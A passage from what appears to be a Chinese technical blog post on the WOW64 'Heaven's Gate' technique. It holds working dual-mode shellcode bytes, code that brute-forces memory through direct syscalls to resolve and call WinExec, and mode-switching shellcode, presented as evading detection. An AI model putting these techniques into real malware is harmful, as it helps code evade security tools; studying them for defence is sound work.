[rsp+20h] [rbp-48h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+28h] [rbp-40h] BYREF</span></span><br><span class="line">  POBJECT_ATTRIBUTES ObjectAttributes; <span class="comment">// [rsp+30h] [rbp-38h] BYREF</span></span><br><span class="line">  __int64 *v11; <span class="comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_CLIENT_ID</span> ClientId; <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  v11 = &amp;v7;</span><br><span class="line">  v1 = (_DWORD *)*a1;</span><br><span class="line">  v2 = a1[<span class="number">1</span>];</span><br><span class="line">  v3 = (<span class="keyword">struct</span> _CLIENT_ID *)a1[<span class="number">3</span>];</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = (<span class="type">void</span> **)((<span class="type">unsigned</span> __int64)&amp;v9 &amp; -(__int64)((_DWORD)v1 != <span class="number">0</span>));</span><br><span class="line">  v8 = <span class="built_in">Wow64ShallowThunkAllocObjectAttributes32TO64_FNC</span>(a1[<span class="number">2</span>], &amp;ObjectAttributes);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">local_unwind_0</span>(v11, &amp;loc_18000BDA6);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)v3 ) &#123;</span><br><span class="line">    p_ClientId = &amp;ClientId;</span><br><span class="line">    ClientId.UniqueThread = (HANDLE)<span class="built_in">SHIDWORD</span>(v3-&gt;UniqueProcess);</span><br><span class="line">    ClientId.UniqueProcess = (HANDLE)<span class="built_in">SLODWORD</span>(v3-&gt;UniqueProcess);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  &#125;</span><br><span class="line">  p_ClientId = v3;</span><br><span class="line">LABEL_4:</span><br><span class="line">  result = <span class="built_in">NtOpenProcess</span>(v4, v2, ObjectAttributes, p_ClientId); <span class="comment">//发出最后对原生系统64位系统中断</span></span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)v1 )</span><br><span class="line">    *v1 = *(_DWORD *)v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="x96-Shellcode"><a href="#x96-Shellcode" class="headerlink" title="x96 Shellcode"></a>x96 Shellcode</h3><p>能够不论系统为x86还是x64，都能运行的Shellcode称为x96 Shellcode：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">; yasm -f bin -o x96shell_msgbox x96shell_msgbox.asm</span><br><span class="line">section .text</span><br><span class="line">bits 32</span><br><span class="line">_main:</span><br><span class="line">call entry</span><br><span class="line">entry:</span><br><span class="line">mov ax, cs</span><br><span class="line">sub ax, 0x23</span><br><span class="line">jz retTo32b</span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line">retTo64b:</span><br><span class="line">add dword [esp], b64_shellcode-entry</span><br><span class="line">ret</span><br><span class="line">retTo32b:</span><br><span class="line">add dword [esp], b32_shellcode-entry</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">; 64 bit shellcode - FatalAppExitA(0, &quot;64bit Hello!&quot;) 64位Shellcode</span><br><span class="line">b64_shellcode:</span><br><span class="line">db 0xE9, 0x2B, 0x01, 0x00, 0x00, 0x90, 0x4C, 0x8D, ...     0x41, 0x02, 0x31, 0xC0, 0x66, 0x83, 0x39, 0x00, 0x74, 0x1E, 0x41, 0x0F, 0xB7, 0x08, 0x49, 0x83, 0xC0, 0x02, 0x89, 0xCA, 0x83, 0xCA, 0x20, 0x0F, 0xB7, 0xD2, 0x01, 0xD0, 0xC1, 0xC8, 0x08, 0x66, 0x85, 0xC9, 0x75, 0xE6, 0xC3, 0x0F, 0x1F, 0x00, 0xC3, 0x4C, 0x8D, 0x41, 0x01, 0x31, 0xC0, 0x80, 0x39, 0x00, 0x74, 0x24, 0x0F, 0x1F, 0x40, 0x00, 0x41, 0x0F, 0xB6, 0x08, 0x49, 0x83, 0xC0, 0x01, 0x89, 0xCA, 0x83, 0xCA, 0x20, 0x0F, 0xBE, 0xD2, 0x01, 0xD0, 0xC1, 0xC8, 0x08, 0x84, 0xC9, 0x75, 0xE7, 0xC3, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0xC3, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x4C, 0x8B, 0x48, 0x20, 0x4C, 0x8D, 0x50, 0x20, 0x4D, 0x39, 0xD1, 0x74, 0x2F, 0x48, 0x83, 0xEC, 0x28, 0x41, 0x89, 0xCB, 0xEB, 0x08, 0x4D, 0x8B, 0x09, 0x4D, 0x39, 0xD1, 0x74, 0x17, 0x49, 0x8B, 0x49, 0x50, 0xE8, 0x71, 0xFF, 0xFF, 0xFF, 0x44, 0x39, 0xD8, 0x75, 0xEA, 0x49, 0x8B, 0x41, 0x20, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x31, 0xC0, 0xC3, 0x57, 0x56, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x63, 0x41, 0x3C, 0x8B, 0xB4, 0x01, 0x88, 0x00, 0x00, 0x00, 0x85, 0xF6, 0x74, 0x42, 0x48, 0x01, 0xCE, 0x8B, 0x46, 0x18, 0x85, 0xC0, 0x74, 0x38, 0x44, 0x8B, 0x4E, 0x20, 0x89, 0xD7, 0x49, 0x89, 0xCB, 0x45, 0x31, 0xD2, 0x8D, 0x58, 0xFF, 0x49, 0x01, 0xC9, 0xEB, 0x03, 0x4D, 0x89, 0xC2, 0x4D, 0x85, 0xC9, 0x74, 0x0F, 0x41, 0x8B, 0x09, 0x4C, 0x01, 0xD9, 0xE8, 0x3D, 0xFF, 0xFF, 0xFF, 0x39, 0xF8, 0x74, 0x18, 0x4D, 0x8D, 0x42, 0x01, 0x49, 0x83, 0xC1, 0x04, 0x4C, 0x39, 0xD3, 0x75, 0xDC, 0x48, 0x83, 0xC4, 0x20, 0x31, 0xC0, 0x5B, 0x5E, 0x5F, 0xC3, 0x90, 0x8B, 0x46, 0x24, 0x4B, 0x8D, 0x14, 0x53, 0x0F, 0xB7, 0x14, 0x02, 0x8B, 0x46, 0x1C, 0x49, 0x8D, 0x14, 0x93, 0x8B, 0x04, 0x02, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5E, 0x5F, 0x4C, 0x01, 0xD8, 0xC3, 0x48, 0xB8, 0x46, 0x61, 0x74, 0x61, 0x6C, 0x41, 0x70, 0x70, 0x57, 0x56, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x89, 0x44, 0x24, 0x32, 0x48, 0x8D, 0x4C, 0x24, 0x32, 0xB8, 0x41, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x3A, 0x45, 0x78, 0x69, 0x74, 0x66, 0x89, 0x44, 0x24, 0x3E, 0xE8, 0xCF, 0xFE, 0xFF, 0xFF, 0x89, 0xC7, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x58, 0x20, 0x48, 0x8D, 0x70, 0x20, 0x48, 0x39, 0xDE, 0x75, 0x0A, 0xEB, 0x45, 0x48, 0x8B, 0x1B, 0x48, 0x39, 0xDE, 0x74, 0x10, 0x48, 0x8B, 0x4B, 0x20, 0x89, 0xFA, 0xE8, 0x1A, 0xFF, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0xE8, 0xC7, 0x44, 0x24, 0x2D, 0x6C, 0x6C, 0x6F, 0x21, 0x48, 0x8D, 0x54, 0x24, 0x25, 0x31, 0xC9, 0x48, 0xBF, 0x36, 0x34, 0x62, 0x69, 0x74, 0x20, 0x48, 0x65, 0x48, 0x89, 0x7C, 0x24, 0x25, 0xC6, 0x44, 0x24, 0x31, 0x00, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0x5E, 0x5F, 0xC3, 0x31, 0xC0, 0xEB, 0xCF, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90</span><br><span class="line"></span><br><span class="line">; 32 bit shellcode - FatalAppExitA(0, &quot;32bit Hello!&quot;) 32位Shellcode</span><br><span class="line">b32_shellcode: </span><br><span class="line">db 0xE9, 0x1E, 0x01, 0x00, 0x00, 0x90, 0x66, 0x83, ...     0x39, 0x00, 0x74, 0x24, 0x53, 0x31, 0xC0, 0x8D, 0x59, 0x02, 0x0F, 0xB7, 0x0B, 0x83, 0xC3, 0x02, 0x89, 0xCA, 0x83, 0xCA, 0x20, 0x0F, 0xB7, 0xD2, 0x01, 0xD0, 0xC1, 0xC8, 0x08, 0x66, 0x85, 0xC9, 0x75, 0xE8, 0x5B, 0xC3, 0x8D, 0x74, 0x26, 0x00, 0x31, 0xC0, 0xC3, 0x80, 0x39, 0x00, 0x74, 0x28, 0x53, 0x31, 0xC0, 0x8D, 0x59, 0x01, 0x66, 0x90, 0x0F, 0xB6, 0x0B, 0x83, 0xC3, 0x01, 0x89, 0xCA, 0x83, 0xCA, 0x20, 0x0F, 0xBE, 0xD2, 0x01, 0xD0, 0xC1, 0xC8, 0x08, 0x84, 0xC9, 0x75, 0xE9, 0x5B, 0xC3, 0x8D, 0xB4, 0x26, 0x00, 0x00, 0x00, 0x00, 0x31, 0xC0, 0xC3, 0x57, 0x56, 0x53, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x58, 0x14, 0x8D, 0x70, 0x14, 0x39, 0xF3, 0x74, 0x27, 0x89, 0xCF, 0xEB, 0x09, 0x8D, 0x76, 0x00, 0x8B, 0x1B, 0x39, 0xF3, 0x74, 0x1A, 0x8B, 0x4B, 0x28, 0xE8, 0x78, 0xFF, 0xFF, 0xFF, 0x39, 0xF8, 0x75, 0xEE, 0x8B, 0x43, 0x10, 0x5B, 0x5E, 0x5F, 0xC3, 0x8D, 0xB4, 0x26, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x31, 0xC0, 0x5E, 0x5F, 0xC3, 0x8B, 0x41, 0x3C, 0x8B, 0x44, 0x01, 0x78, 0x85, 0xC0, 0x74, 0x6F, 0x55, 0x01, 0xC8, 0x57, 0x56, 0x53, 0x83, 0xEC, 0x08, 0x8B, 0x78, 0x18, 0x89, 0x44, 0x24, 0x04, 0x85, 0xFF, 0x74, 0x28, 0x8B, 0x58, 0x20, 0x89, 0x14, 0x24, 0x89, 0xCE, 0x31, 0xED, 0x01, 0xCB, 0x85, 0xDB, 0x74, 0x0E, 0x8B, 0x0B, 0x01, 0xF1, 0xE8, 0x55, 0xFF, 0xFF, 0xFF, 0x3B, 0x04, 0x24, 0x74, 0x1D, 0x83, 0xC5, 0x01, 0x83, 0xC3, 0x04, 0x39, 0xEF, 0x75, 0xE4, 0x83, 0xC4, 0x08, 0x31, 0xC0, 0x5B, 0x5E, 0x5F, 0x5D, 0xC3, 0x89, 0xF6, 0x8D, 0xBC, 0x27, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x7C, 0x24, 0x04, 0x8D, 0x04, 0x6E, 0x03, 0x47, 0x24, 0x0F, 0xB7, 0x00, 0x8D, 0x04, 0x86, 0x03, 0x47, 0x1C, 0x03, 0x30, 0x83, 0xC4, 0x08, 0x5B, 0x89, 0xF0, 0x5E, 0x5F, 0x5D, 0xC3, 0x90, 0x31, 0xC0, 0xC3, 0x57, 0xB8, 0x41, 0x00, 0x00, 0x00, 0x56, 0x53, 0x83, 0xEC, 0x30, 0x8D, 0x4C, 0x24, 0x22, 0xC7, 0x44, 0x24, 0x22, 0x46, 0x61, 0x74, 0x61, 0xC7, 0x44, 0x24, 0x26, 0x6C, 0x41, 0x70, 0x70, 0xC7, 0x44, 0x24, 0x2A, 0x45, 0x78, 0x69, 0x74, 0x66, 0x89, 0x44, 0x24, 0x2E, 0xE8, 0xDF, 0xFE, 0xFF, 0xFF, 0x89, 0xC7, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x58, 0x14, 0x8D, 0x70, 0x14, 0x39, 0xDE, 0x75, 0x0D, 0xEB, 0x55, 0x90, 0x8D, 0x74, 0x26, 0x00, 0x8B, 0x1B, 0x39, 0xDE, 0x74, 0x0E, 0x8B, 0x4B, 0x10, 0x89, 0xFA, 0xE8, 0x26, 0xFF, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0xEC, 0x8D, 0x54, 0x24, 0x15, 0xC7, 0x44, 0x24, 0x15, 0x33, 0x32, 0x62, 0x69, 0xC7, 0x44, 0x24, 0x19, 0x74, 0x20, 0x48, 0x65, 0xC7, 0x44, 0x24, 0x1D, 0x6C, 0x6C, 0x6F, 0x21, 0xC6, 0x44, 0x24, 0x21, 0x00, 0x89, 0x54, 0x24, 0x04, 0xC7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x83, 0xEC, 0x08, 0x83, 0xC4, 0x30, 0x5B, 0x5E, 0x5F, 0xC3, 0x8D, 0x74, 0x26, 0x00, 0x31, 0xC0, 0xEB, 0xC0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90</span><br></pre></td></tr></table></figure>

<h3 id="滥用天堂之门暴搜记忆体"><a href="#滥用天堂之门暴搜记忆体" class="headerlink" title="滥用天堂之门暴搜记忆体"></a>滥用天堂之门暴搜记忆体</h3><p>经典Shellcode技巧是通过FS:30h或GS:60h取得当前TEB，再找PEB和Ldr，获得当前已挂载的记忆体模组有哪些，找到对应模组基址就能以PE攀爬技巧取出导出的API的绝对地址。这种方法容易被发现，这里可滥用天堂之门暴力搜索记忆体。</p>
<p>这里直接透过天堂之门，用API的系统函数识别码呼叫即可，不必定位API绝对地址。其中TEB+C0h处用于摆放<code>wow64cpu!X86SwitchTo64BitMode</code>绝对地址。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isMemExist</span><span class="params">(<span class="type">size_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> retv;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="keyword">xor</span> ebx, ebx</span><br><span class="line">        push[addr]</span><br><span class="line">        push ebx</span><br><span class="line">        push ebx</span><br><span class="line">        push ebx</span><br><span class="line">        mov eax, <span class="number">0x29</span>              <span class="comment">// ZwAccessCheckAndAuditAlarm 用于确定一块记忆体存在与否</span></span><br><span class="line">        call dword ptr fs : [<span class="number">0xc0</span>] <span class="comment">// Heaven&#x27;s Gate 呼叫天堂之门</span></span><br><span class="line">        add esp, <span class="number">0x0c</span></span><br><span class="line">        pop edx</span><br><span class="line">        mov[retv], eax</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">char</span>(retv) != <span class="number">5</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">bruteSearch_WinAPI</span><span class="params">(PCSTR apiName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> addr = <span class="number">0x1000</span>; addr &lt; <span class="number">0xFF000000</span>; addr += <span class="number">0x1000</span>) <span class="comment">//0x1000为一个分页大小</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isMemExist</span>(addr))</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">PIMAGE_DOS_HEADER</span>(addr)-&gt;e_magic == IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">                <span class="type">char</span> modulePath[MAX_PATH];</span><br><span class="line">                <span class="built_in">GetModuleFileNameA</span>(<span class="built_in">HMODULE</span>(addr), modulePath, <span class="built_in">sizeof</span>(modulePath));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] detect %s at %p\n&quot;</span>, modulePath, addr);</span><br><span class="line">                <span class="comment">// parse export table</span></span><br><span class="line">                <span class="keyword">auto</span> nth = <span class="built_in">PIMAGE_NT_HEADERS</span>(addr + <span class="built_in">PIMAGE_DOS_HEADER</span>(addr)-&gt;e_lfanew);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">auto</span> rva = nth-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> eat = <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(addr + rva);</span><br><span class="line">                    <span class="keyword">auto</span> nameArr = <span class="built_in">PDWORD</span>(addr + eat-&gt;AddressOfNames);</span><br><span class="line">                    <span class="keyword">auto</span> funcArr = <span class="built_in">PDWORD</span>(addr + eat-&gt;AddressOfFunctions);</span><br><span class="line">                    <span class="keyword">auto</span> nameOrd = <span class="built_in">PWORD</span>(addr + eat-&gt;AddressOfNameOrdinals);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; eat-&gt;NumberOfFunctions; i++)</span><br><span class="line">                        <span class="keyword">if</span> (!<span class="built_in">stricmp</span>(<span class="built_in">PCHAR</span>(addr + nameArr[i]), apiName))</span><br><span class="line">                            <span class="keyword">return</span> addr + funcArr[nameOrd[i]];</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> ptrWinExec = <span class="built_in">bruteSearch_WinAPI</span>(<span class="string">&quot;WinExec&quot;</span>))</span><br><span class="line">        (<span class="keyword">decltype</span>(&amp;WinExec)(ptrWinExec))(<span class="string">&quot;cmd /c whoami &amp;&amp; pause&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="天堂圣杯"><a href="#天堂圣杯" class="headerlink" title="天堂圣杯"></a>天堂圣杯</h3><p>主要通过滥用切换CS来改变当前英特尔解析指令集。这里涉及两套巨集，一个是32位运行下切换至64位使用的巨集，另一个是64位运行下切换回32位使用的巨集。64位TEB和PEB记载的资讯是64位的，得用下面些函数读取4GB以上资料内容，并用<code>memcpy64</code>拷贝资料：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> memcpy64 = ((<span class="built_in">void</span>(cdecl*)(ULONG64, ULONG64, ULONG64))((PCSTR)</span><br><span class="line">    <span class="comment">// enter 64 bit mode 切换至64位模式</span></span><br><span class="line">    <span class="string">&quot;\x6a\x33\xe8\x00\x00\x00\x00\x83\x04\x24\x05\xcb&quot;</span></span><br><span class="line">    <span class="comment">// memcpy for 64 bit 读取起点RSI 写入起点RDI 拷贝用rep movs [rdi],[rsi]</span></span><br><span class="line">    <span class="string">&quot;\x67\x48\x8b\x7c\x24\x04\x67\x48\x8b\x74\x24\x0c\x67\x48\x8b\x4c\x24\x14\xf3\xa4&quot;</span></span><br><span class="line">    <span class="comment">// exit 64 bit mode 切换回64位模式</span></span><br><span class="line">    <span class="string">&quot;\xe8\x00\x00\x00\x00\xc7\x44\x24\x04\x23\x00\x00\x00\x83\x04\x24\x0d\xcb\xc3&quot;</span></span><br><span class="line">));</span><br><span class="line"><span class="function">PEB64* <span class="title">getPtr_Peb64</span><span class="params">()</span> </span>&#123; <span class="comment">//泄露当前WOW64进程中64位PEB环境资讯块位址</span></span><br><span class="line">    <span class="comment">// mov eax,gs:[00000060]; ret</span></span><br><span class="line">    <span class="keyword">return</span> ((PEB64 * (*)()) &amp; <span class="string">&quot;\x65\xA1\x60\x00\x00\x00\xC3&quot;</span>)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">get64b_CSTR</span><span class="params">(ULONG64 ptr64bStr)</span> </span>&#123; <span class="comment">//将4GB位址以上的字符数组字符串或宽字符数组字符串拷贝到32位变数中 以string资料结构储存</span></span><br><span class="line">    CHAR szBuf[MAX_PATH];</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG64)&amp;szBuf, ptr64bStr, <span class="built_in">sizeof</span>(szBuf));</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">new</span> <span class="built_in">string</span>(szBuf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">wstring <span class="title">get64b_WSTR</span><span class="params">(ULONG64 ptr64bStr)</span> </span>&#123; <span class="comment">//将4GB位址以上的字符数组字符串或宽字符数组字符串拷贝到32位变数中 以wstring资料结构储存</span></span><br><span class="line">    WCHAR szBuf[MAX_PATH];</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG64)&amp;szBuf, ptr64bStr, <span class="built_in">sizeof</span>(szBuf));</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">new</span> <span class="built_in">wstring</span>(szBuf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">UINT64 <span class="title">getPtr_Module64</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* szDllName)</span> </span>&#123; <span class="comment">//泄露任意指定名称的64位DLL映像基址</span></span><br><span class="line">    PEB_LDR_DATA64 ldrNode = &#123;&#125;;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY64 currNode = &#123;&#125;;</span><br><span class="line">    <span class="comment">// fetch ldr head node</span></span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG64)&amp;ldrNode, (ULONG64)<span class="built_in">getPtr_Peb64</span>()-&gt;Ldr, <span class="built_in">sizeof</span>(ldrNode));</span><br><span class="line">    <span class="comment">// read the first ldr node (should be the current EXE module)</span></span><br><span class="line">    <span class="keyword">for</span> (ULONG64 ptrCurr = ldrNode.InLoadOrderModuleList.Flink;; ptrCurr = currNode.InLoadOrderLinks.Flink) &#123;</span><br><span class="line">        <span class="built_in">memcpy64</span>((ULONG64)&amp;currNode, ptrCurr, <span class="built_in">sizeof</span>(currNode));</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">wcsstr</span>(szDllName, <span class="built_in">get64b_WSTR</span>(currNode.BaseDllName.Buffer).<span class="built_in">c_str</span>()))</span><br><span class="line">            <span class="keyword">return</span> currNode.DllBase;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getPtr_Wow64SystemServiceEx</span><span class="params">(UINT64 &amp;value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> ptr_wow64Mod = <span class="built_in">getPtr_Module64</span>(<span class="string">L&quot;wow64.dll&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[v] current wow64.dll @ %llx\n&quot;</span>, ptr_wow64Mod);</span><br><span class="line">    <span class="type">char</span> exeBuf[<span class="number">4096</span>];</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)&amp;exeBuf, ptr_wow64Mod, <span class="built_in">sizeof</span>(exeBuf));</span><br><span class="line">    <span class="keyword">auto</span> k = <span class="built_in">PIMAGE_NT_HEADERS64</span>(&amp;exeBuf[<span class="number">0</span>] + <span class="built_in">PIMAGE_DOS_HEADER</span>(exeBuf)-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">auto</span> rvaExportTable = k-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)&amp;exeBuf, ptr_wow64Mod + rvaExportTable, <span class="built_in">sizeof</span>(exeBuf));</span><br><span class="line">    <span class="keyword">auto</span> numOfNames = <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(exeBuf)-&gt;NumberOfNames;</span><br><span class="line">    <span class="keyword">auto</span> arrOfNames = <span class="keyword">new</span> UINT32[numOfNames + <span class="number">1</span>], arrOfFuncs = <span class="keyword">new</span> UINT32[numOfNames + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">auto</span> addrOfNameOrds = <span class="keyword">new</span> UINT16[numOfNames + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)arrOfNames, ptr_wow64Mod + <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(exeBuf)-&gt;AddressOfNames, <span class="built_in">sizeof</span>(UINT32) * numOfNames);</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)addrOfNameOrds, ptr_wow64Mod + <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(exeBuf)-&gt;AddressOfNameOrdinals, <span class="built_in">sizeof</span>(UINT16) * numOfNames);</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)arrOfFuncs, ptr_wow64Mod + <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(exeBuf)-&gt;AddressOfFunctions, <span class="built_in">sizeof</span>(UINT32) * numOfNames);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; numOfNames; i++) &#123;</span><br><span class="line">        <span class="keyword">auto</span> currApiName = <span class="built_in">get64b_CSTR</span>(ptr_wow64Mod + arrOfNames[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[v] found export API -- %s\n&quot;</span>, currApiName.<span class="built_in">c_str</span>());</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(<span class="string">&quot;Wow64SystemServiceEx&quot;</span>, currApiName.<span class="built_in">c_str</span>()))</span><br><span class="line">            value = ptr_wow64Mod + arrOfFuncs[addrOfNameOrds[i]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来定位当前WOW64进程中64位天堂翻译机函数<code>wow64!Wow64SystemServiceEx</code>绝对地址：</p>
